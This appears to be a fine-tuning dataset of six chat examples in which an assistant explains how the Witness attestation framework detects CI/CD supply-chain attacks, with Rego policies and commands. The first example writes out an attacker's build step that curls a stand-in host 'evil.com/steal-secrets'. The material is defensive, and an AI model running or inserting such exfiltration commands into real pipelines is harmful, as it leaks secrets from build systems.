{"messages": [{"role": "system", "content": "You are an expert in the Witness supply chain attestation framework. You help users instrument CI/CD pipelines with witness, create policy documents, and write Rego policies to validate attestations. You understand all attestors in go-witness and how to use them effectively."}, {"role": "user", "content": "How does witness detect if an attacker modifies my build command in CI?"}, {"role": "assistant", "content": "Witness detects modified build commands through the command-run attestor and Rego policies.\n\n**Attack Vector**:\nAttacker gains access to CI configuration and changes:\n```yaml\n# Original\n- run: go build -o app\n\n# Attacker modifies to\n- run: go build -o app && curl evil.com/steal-secrets\n```\n\n**Detection with Witness**:\n```rego\npackage commandrun\n\nimport rego.v1\n\n# Allowlist approved commands\napproved_commands := {\n    [\"go\", \"build\", \"-o\", \"app\"],\n    [\"make\", \"all\"]\n}\n\ndeny contains msg if {\n    not input.cmd in approved_commands\n    msg := sprintf(\"Unauthorized command detected: %v\", [input.cmd])\n}\n```\n\n**How it works**:\n1. Witness records the actual command executed\n2. Policy verifies command matches allowlist\n3. Modified command fails verification\n4. Attack is detected before deployment\n\n**Remediation**:\n- Review CI configuration for unauthorized changes\n- Rotate signing keys if compromised\n- Investigate how attacker gained access"}], "_metadata": {"attack_type": "Compromised Build Command", "category": "supply_chain_security"}}
{"messages": [{"role": "system", "content": "You are an expert in the Witness supply chain attestation framework. You help users instrument CI/CD pipelines with witness, create policy documents, and write Rego policies to validate attestations. You understand all attestors in go-witness and how to use them effectively."}, {"role": "user", "content": "How does witness prevent someone from modifying my build artifact after it's created?"}, {"role": "assistant", "content": "Witness prevents artifact tampering through cryptographic hashing in product attestations.\n\n**Attack Vector**:\nAttacker modifies binary after build but before deployment:\n```bash\n# Build creates app (hash: abc123)\ngo build -o app\n\n# Attacker injects malware\necho \"malicious code\" >> app  # Now hash: def456\n```\n\n**Detection with Witness**:\nThe product attestor records SHA256 hash of files:\n```json\n{\n  \"app\": {\n    \"sha256\": \"abc123...original-hash\"\n  }\n}\n```\n\nWhen you try to verify tampered file:\n```bash\nwitness verify -p policy.json -a build.att -f app\n# FAILS: artifact hash mismatch\n```\n\n**How it works**:\n1. Product attestor hashes file immediately after build\n2. Hash is cryptographically signed\n3. Any modification changes the hash\n4. Verification detects mismatch\n\n**Why this matters**: Even if attacker has deployment access, they cannot modify artifacts without detection."}], "_metadata": {"attack_type": "Artifact Tampering", "category": "supply_chain_security"}}
{"messages": [{"role": "system", "content": "You are an expert in the Witness supply chain attestation framework. You help users instrument CI/CD pipelines with witness, create policy documents, and write Rego policies to validate attestations. You understand all attestors in go-witness and how to use them effectively."}, {"role": "user", "content": "How does witness prevent an attacker from creating fake attestations?"}, {"role": "assistant", "content": "Witness prevents fake attestations through functionary validation in policies.\n\n**Attack Vector**:\nAttacker creates their own attestation with stolen/fake signing key.\n\n**Detection with Witness Policy**:\n```json\n{\n  \"publickeys\": {\n    \"trusted-ci-key\": {\n      \"keyid\": \"sha256:abc123...\",\n      \"key\": \"-----BEGIN PUBLIC KEY-----...\"\n    }\n  },\n  \"steps\": {\n    \"build\": {\n      \"functionaries\": [{\n        \"type\": \"publickey\",\n        \"publickeyid\": \"trusted-ci-key\"\n      }]\n    }\n  }\n}\n```\n\n**How it works**:\n1. Policy lists ONLY authorized signing keys\n2. `witness verify` checks attestation signature\n3. If signed by different key \u2192 verification fails\n4. Attacker's fake attestation rejected\n\n**Key Management Best Practices**:\n- Store signing keys in CI secrets/vault\n- Never commit private keys to git\n- Rotate keys periodically\n- Use different keys for different steps"}], "_metadata": {"attack_type": "Unauthorized Signer", "category": "supply_chain_security"}}
{"messages": [{"role": "system", "content": "You are an expert in the Witness supply chain attestation framework. You help users instrument CI/CD pipelines with witness, create policy documents, and write Rego policies to validate attestations. You understand all attestors in go-witness and how to use them effectively."}, {"role": "user", "content": "How can witness help detect dependency confusion attacks?"}, {"role": "assistant", "content": "Witness detects dependency changes through lockfiles and material attestors.\n\n**Attack Vector**:\nAttacker publishes malicious package with same name as internal package:\n```\nInternal: @company/auth v1.0.0\nPublic: @company/auth v99.0.0 (malicious)\n```\n\n**Detection with Witness**:\n```rego\npackage lockfiles\n\nimport rego.v1\n\n# Expected dependency hashes\napproved_deps := {\n    \"@company/auth\": \"sha256:abc123...\"\n}\n\ndeny contains msg if {\n    some pkg, hash in input.packages\n    pkg in approved_deps\n    hash != approved_deps[pkg]\n    msg := sprintf(\"Dependency %s hash mismatch\", [pkg])\n}\n```\n\n**How it works**:\n1. Lockfiles attestor captures package-lock.json\n2. Policy validates dependency hashes\n3. Unexpected package version detected\n4. Build fails before using malicious dependency\n\n**Additional Protection**:\n- Use material attestor to track package-lock.json changes\n- Rego validates no unexpected modifications"}], "_metadata": {"attack_type": "Dependency Confusion", "category": "supply_chain_security"}}
{"messages": [{"role": "system", "content": "You are an expert in the Witness supply chain attestation framework. You help users instrument CI/CD pipelines with witness, create policy documents, and write Rego policies to validate attestations. You understand all attestors in go-witness and how to use them effectively."}, {"role": "user", "content": "How does witness detect if my GitHub Actions workflow is compromised?"}, {"role": "assistant", "content": "Witness detects workflow tampering through GitHub attestor and environment validation.\n\n**Attack Vector**:\nAttacker modifies .github/workflows/build.yml to:\n- Disable tests\n- Exfiltrate secrets\n- Inject backdoors\n\n**Detection with Witness**:\n```rego\npackage github\n\nimport rego.v1\n\n# Expected workflow file hash\nexpected_workflow_hash := \"sha256:abc123...\"\n\ndeny contains msg if {\n    input.workflow != \"build.yml\"\n    msg := \"Unexpected workflow file\"\n}\n```\n\n**Environment attestor catches changes**:\n```rego\npackage environment\n\nimport rego.v1\n\ndeny contains msg if {\n    \"DISABLE_TESTS\" in input.variables\n    msg := \"Tests cannot be disabled\"\n}\n```\n\n**Multi-layer defense**:\n1. GitHub attestor records workflow name\n2. Environment attestor captures all env vars\n3. Policies detect suspicious variables\n4. Material attestor tracks .github/workflows/ changes"}], "_metadata": {"attack_type": "CI Pipeline Compromise", "category": "supply_chain_security"}}
{"messages": [{"role": "system", "content": "You are an expert in the Witness supply chain attestation framework. You help users instrument CI/CD pipelines with witness, create policy documents, and write Rego policies to validate attestations. You understand all attestors in go-witness and how to use them effectively."}, {"role": "user", "content": "How does witness detect unsigned commits in my build?"}, {"role": "assistant", "content": "Witness detects unsigned commits through git attestor signature validation.\n\n**Attack Vector**:\nAttacker pushes unsigned commit with malicious code.\n\n**Detection with Witness**:\n```rego\npackage git\n\nimport rego.v1\n\n# Require GPG signatures\ndeny contains msg if {\n    count(input.signature) == 0\n    msg := \"Commit must be GPG signed\"\n}\n\ndeny contains msg if {\n    not startswith(input.signature, \"-----BEGIN PGP SIGNATURE-----\")\n    msg := \"Invalid signature format\"\n}\n```\n\n**How it works**:\n1. Git attestor captures commit signature\n2. Policy requires non-empty signature field\n3. Unsigned commits fail verification\n\n**Setup GPG signing**:\n```bash\n# Configure git to sign commits\ngit config --global user.signingkey <key-id>\ngit config --global commit.gpgsign true\n\n# Verify in attestation\nwitness run --step build -a git -k key.pem -o build.att -- go build\njq '.predicate.attestations[] | select(.type | contains(\"git\")) | .attestation.signature' build.att\n```\n\n**Why this matters**: Ensures all code is traceable to verified developers."}], "_metadata": {"attack_type": "Unsigned Commit Injection", "category": "supply_chain_security"}}
